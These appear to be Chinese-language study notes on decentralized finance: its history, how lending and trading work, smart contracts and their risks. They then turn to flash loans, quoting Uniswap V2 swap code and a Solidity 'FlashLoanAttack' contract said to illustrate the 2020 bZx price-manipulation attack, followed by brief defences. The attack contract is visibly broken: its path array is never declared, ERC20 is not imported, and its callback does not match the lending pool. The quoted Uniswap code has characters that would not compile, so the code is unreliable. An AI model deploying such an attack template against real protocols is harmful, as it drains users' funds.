去中心化金融，提供了去中心化的金融服务，如賺取利息、借款、借貸、買保險、交易衍生產品、交易資產等等。但它的速度更快，並且不需要繁雜的文書工作或第三方。與一般的加密貨幣一樣，DeFi 是全球性的點對點（直接在兩個人之間，而不是透過集中式系統進行路由）金融應用程式，可以保持投資者匿名，且對所有人開放。
* 1.0
	* 以太坊技術成熟，智能合約的應用也日趨廣泛，替 DeFi 發展提供了技術基礎；
	- 傳統金融體系的不足，激發了市場對更高效、更透明、更開放的金融服務的需求；
	- 風險投資基金對 DeFi 專案的投資力度不斷加大。
	- 經典案例：
		- 去中心化借貸平台 Compound Finance 推出治理代幣 COMP，推動'流動性挖礦（Yield Farming）'
		- 流動性挖礦是指，用戶將兩種不同的加密貨幣資產，投入規定的流動性池中，當其他用戶在平台上使用該流動性池進行交易時，平台會向交易者收取少量費用。平台會將一部分的交易費用作為獎勵，分配給流動性提供者。
		- 總鎖定價值（Total Value Locked，簡稱 TVL）是一個用於衡量 DeFi 平台或協議中鎖定資產總價值的指標。TVL 代表鎖定在智能合約中的資金總額，包括：存款、抵押和流動性池中的資金。TVL 越高，通常代表越多用戶參與，因此也就會有越高的平台信任度。
* 2.0
	* 解決1.0挑戰
		* 過度依賴激勵措施
		* 治理代幣分配不均
		* 安全問題
	* 試圖協議自有流動性（protocol-owned liquidity）和更複雜的代幣經濟學，來解決流動性問題。
	* 經典案例；
		* 打造不依賴傳統法定貨幣的去中心化儲備貨幣組織 Olympus DAO
		* DeFi 借貸協議 Aave V4
		* 去中心化永續期貨交易的區塊鏈協議 Hyperliquid 
		* 去中心化交易協議 Uniswap v4
* 3.0
	* 關鍵因素：
		* DeFi 應用不再侷限於加密貨幣交易，而是與現實世界資產（RWA）深度融合，例如：房地產抵押貸款和供應鏈金融等領域，[案例](https://www.financemagnates.com/cryptocurrency/defi-beyond-crypto-the-rise-of-real-world-assets-tokenization/)
		* 機構級 DeFi 蓬勃發展，[傳統金融機構紛紛入場](https://www.globenewswire.com/news-release/2024/07/24/2925498/0/en/Franklin-Templeton-Launches-Benji-Investments-a-DeFi-Platform.html)，並積極參與 DeFi 協議。為了滿足機構的合規需求， DeFi 基礎設施也不斷升級。
			* 傳統資產管理公司富蘭克林（Franklin Templeton）就推出了基於 Polygon 區塊鏈的平台 Benji Investments，主要的功能就是為機構投資者提供進入 DeFi 收益產品的便捷入口。
		* 安全性顯著提高，降低了 DeFi 工具的使用門檻。
			* 採用多層防護措施、形式化驗證和 AI 驅動的安全系統，有效應對各種安全風險。
			* 以太坊新增的帳戶抽象功能（Account Abstraction），將帳戶與密鑰管理分開來，讓用戶在遺失線上錢包私鑰時，能更容易恢復帳戶，使用者體驗也大幅改善
			* 社交恢復（ Social Recovery Wallet）則可以透過個人可信賴的社交網路，來恢復錢包存取權。
## 如何運作
- **借出**：借出您的加密貨幣，每分鐘都能賺取利息和獎勵，而不是每個月一次。    
- **申請貸款**：無需填寫文書即可立即獲得貸款，包括傳統金融機構不提供的極短期「快速貸款」。(Compound Finance 推出治理代幣 COMP，點燃了「流動性挖礦（Yield Farming）」的熱潮。)
- **交易**：對某些加密貨幣資產進行點對點交易 — 就好像您可以在沒有任何經紀人的情況下買賣股票。    
- **為未來儲蓄**：將您的一些加密貨幣放入儲蓄帳戶替代方案中，並獲得比通常銀行所給的利率更高的利率。     
- **購買衍生產品**：對某些資產做多或做空賭注。將它們視為加密貨幣版本的股票期權或期貨合約。

## 智能合約
去中心化金融的大多數現有及潛在應用均涉及智能合約的建立及執行。一般合約會使用法律術語來闡明簽訂合約實體間的關係條款，而智能合約則使用電腦程式碼。

由於這些條款均運用電腦程式碼編寫，智能合約能夠自動執行這些條款。這讓目前許多需要人工監督的業務流程能夠可靠地執行及自動化。

使用智能合約讓交易過程更為快捷方便，同時又能降低交易雙方的風險。然而，智能合約也帶來了新的風險類型。由於電腦程式碼極易出現錯誤和漏洞，鎖定在智能合約內的價值和機密資訊均承受相關風險。

## 缺點
- 區塊鏈本質上就比其中心化對手慢，這影響了建立在其上的應用程式。DeFi 應用程式的開發者需要考慮這些限制，並相應地優化其產品。像 Arbitrum 和 Optimism 這樣的第 2 層解決方案正在解決這些問題，提供更快速、更便宜的交易。
- 以太坊區塊鏈上的交易率波動意味著活躍的交易操作可能會變得十分昂貴。
- 根據使用的 dapp 以及使用方式的不同，投資可能會經歷高波動性，畢竟這算是一項新技術。
- 出於報稅目的，必須保有自己的記錄。相關法規可能因地區而異。
- 資安風險高：DeFi 主要依靠智能合約運作和執行各類交易，一旦智能合約初始的設計有漏洞，又或是遭到駭客攻擊，用戶財產就會處於極高風險之中，蒙受鉅額損失。同時，因為 DeFi 是去中心化的，並不會像交易所這樣的中心化機構，可以提供客服協助或使用教學，損失通常難以追回。

然而，由于其开放、透明且没有中介的特点，DeFi也成为了黑客攻击的热点。以下是DeFi常见的安全风险及其防御措施：

## 閃電貸(Flash Loan)
* 閃電貸：無抵押借款的服務。常見的事以太坊閃電貸，通過以太坊交易機制來保證可以進行無抵押借出資金。并且可以在一筆交易中一種包含很多步驟，借款、兌換、使用、還款。
* 主流平臺：
	* Aave
	* dydx
	* Uniswap
* solidity閃電貸：基於solidity支援動態呼叫的這一個特性設計的，
```
// 每次調用都可以傳入不同地址
function callfun(address addr) public {
addr.call();
}

/** 
 * 閃電貸的三個核心功能
 * 首先直接將資金發送給呼叫者
 * 再調用呼叫者合約，從而讓呼叫者使用這些資金
 * 呼叫者使用結束，檢查是否歸還資金以及手續費，如果檢查失敗則回滾交易。（此處也可以直接使用transferfrom 函式將呼叫則資金轉移回來）
 */
 
function flashloan(uint amount, address to) {
transfer (to, amount); // 傳送資金給呼叫者
to.call ();// 調用呼叫者的合約函數
check ();// 檢查是否歸還資金
}
```
![](shandiandai-sol.png)

```
// Uniswap 閃電貸邏輯
function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {

require(amount0Out > 0 || amount1Out > 0, ‘UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT’);

(uint112 _reserve0, uint112 _reserve1,) = getReserves();

require(amount0Out < _reserve0 && amount1Out < _reserve1, ‘UniswapV2: INSUFFICIENT_LIQUIDITY’); uint balance0; uint balance1; { address _token0 = token0; address _token1 = token1; require(to != _token0 && to != _token1, ‘UniswapV2: INVALID_TO’); /** 將資金轉給使用者 **/ if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out);

if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out);

/** 調用使用者指定的目標函式 **/

if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);

balance0 = IERC20(_token0).balanceOf(address(this));

balance1 = IERC20(_token1).balanceOf(address(this));

}

uint amount0In = balance0 > _reserve0 – amount0Out ? balance0 – (_reserve0 – amount0Out) : 0;

uint amount1In = balance1 > _reserve1 – amount1Out ? balance1 – (_reserve1 – amount1Out) : 0;

require(amount0In > 0 || amount1In > 0, ‘UniswapV2: INSUFFICIENT_INPUT_AMOUNT’);

{

uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));

uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));

/** 檢查使用者是否歸還資金以及手續費 **/

require(balance0Adjusted.mul(balance1Adjusted)>=uint(_reserve0).mul(_reserve1).mul(1000**2), ‘UniswapV2: K’);

}

_update(balance0, balance1, _reserve0, _reserve1);

emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);

}
```

### 閃電貸攻擊（Flash Loan Attack）
流程：
* 借入資金
* 操縱市場。套利，利用智能合約漏洞
* 在同一個交易中立即歸還
攻擊原理：
1. 識別套利機會：攻擊者主動發現不同DEX或平臺間的價格差異
2. 智能合約：包含借入閃電貸、執行套利交易、償還貸款，在一個交易中完成所有操作
3. 借入閃電貸
4. 執行套利交易
	1. 交易1：在價格i驕傲地的平臺購買加密貨幣
	2. 交易2：在另一個較高價格的平臺出售
	3. 償還貸款
	4. 收取利潤：貸款償還后攻擊者就可以提取智能合約中剩餘的利潤
```
/**
	bzx是一个去中心化借贷协议，在 2020 年 2 月遭遇了著名的 **Flash Loan Attack**。攻击者利     用闪电贷从 dYdX 和 Uniswap 上借取大量资金，并通过价格操控和市场操纵实施攻击。该攻击导致了     bZx 协议遭受大规模资金损失，约为 100 万美元。
 */

pragma solidity ^0.6.6;

// 引入闪电贷池接口，允许借取资产
interface ILendingPool {
    function flashLoan(
        address receiver, // 借款人地址
        address asset,    // 借款资产
        uint256 amount,   // 借款数量
        bytes calldata params // 附加参数
    ) external;
}

// 引入 Uniswap 路由器接口，用于执行资产交换
interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint amountIn,           // 输入的资产数量
        uint amountOutMin,       // 最小输出资产数量（防止滑点问题）
        address[] calldata path, // 交换路径（例如从某种资产换成ETH）
        address to,              // 收款地址
        uint deadline            // 交易截止时间
    ) external returns (uint[] memory amounts); // 返回交换的资产数量
}

contract FlashLoanAttack {
    address private owner;  // 合约拥有者地址
    ILendingPool private lendingPool;  // 闪电贷池接口
    IUniswapV2Router02 private uniswapRouter;  // Uniswap 路由器接口

    // 闪电贷攻击合约构造函数，初始化借贷池和Uniswap路由器地址
    constructor(address _lendingPool, address _uniswapRouter) public {
        owner = msg.sender;  // 合约创建者为合约的拥有者
        lendingPool = ILendingPool(_lendingPool);  // 设置借贷池地址
        uniswapRouter = IUniswapV2Router02(_uniswapRouter);  // 设置Uniswap路由器地址
    }

    // 攻击触发函数，由合约拥有者调用发起闪电贷
    function attack(address asset, uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute the attack");  // 只有合约拥有者才能执行攻击
        
        // 发起闪电贷，借入指定资产及数量
        lendingPool.flashLoan(address(this), asset, amount, "");
    }

    // 闪电贷执行回调函数，在借贷池放款后自动调用
    function executeFlashLoan(
        address asset,         // 借款资产地址
        uint256 amount,        // 借款数量
        uint256 fee,           // 闪电贷费用
        bytes calldata params  // 其他参数（此例为空）
    ) external {
        require(msg.sender == address(lendingPool), "Unauthorized");  // 确保调用者是借贷池

        // 执行市场价格操控，通过Uniswap交换资产
        address ; // 交换路径数组，包含两种资产（例如从借款资产到ETH）
        path[0] = asset;  // 输入资产（借来的资产）
        path[1] = address(0);  // 目标资产（例如ETH）

        // 使用Uniswap交换资产，操控市场价格
        uniswapRouter.swapExactTokensForTokens(amount, 1, path, address(this), block.timestamp);
        
        // 计算还款总额：借款金额 + 费用
        uint256 totalDebt = amount + fee;
        
        // 确保合约能够偿还闪电贷及其费用
        require(ERC20(asset).transfer(address(lendingPool), totalDebt), "Repayment failed");
    }

    // 提取合约中的资金（只有合约拥有者可以执行）
    function withdraw(address token, uint256 amount) external {
        require(msg.sender == owner, "Only owner can withdraw");  // 只有合约拥有者才能提取资金
        ERC20(token).transfer(owner, amount);  // 转账指定数量的资产到合约拥有者
    }
}

```

防禦措施
1. **價格預言機保護**：使用多個去中心化的預言機，如 Chainlink，減少單點故障的風險。    
2. **增加抵押要求**：提高閃電貸的抵押品要求，減少無抵押借款的風險。    
3. **滑點和交易限制**：在去中心化交易所（DEX）上設置最大交易量或滑點限制，減少市場操控的空間。

## 重入攻擊
## 參考文獻
[1] https://xrex.io/tw/zh/blog/beginner-s-guide/what-is-defi-decentralized-finance-pros-and-cons-zh/
[2] https://www.coinbase.com/zh-tw/learn/crypto-basics/what-is-defi
[3] https://academy.binance.com/zh-TC/articles/the-complete-beginners-guide-to-decentralized-finance-defi#%E6%99%BA%E8%83%BD%E5%90%88%E7%B4%84%E5%9C%A8-DeFi-%E4%B8%AD%E7%9A%84%E8%A7%92%E8%89%B2
[4] https://www.blocktempo.com/what-are-the-differences-in-the-implementation-of-flash-loans-in-solidity-move-and-rust/
[5] https://zhuanlan.zhihu.com/p/711226462
[6] https://www.blocktempo.com/defi-hacked-over-120-m-usd-this-year-innovation-finance-turned-to-atm/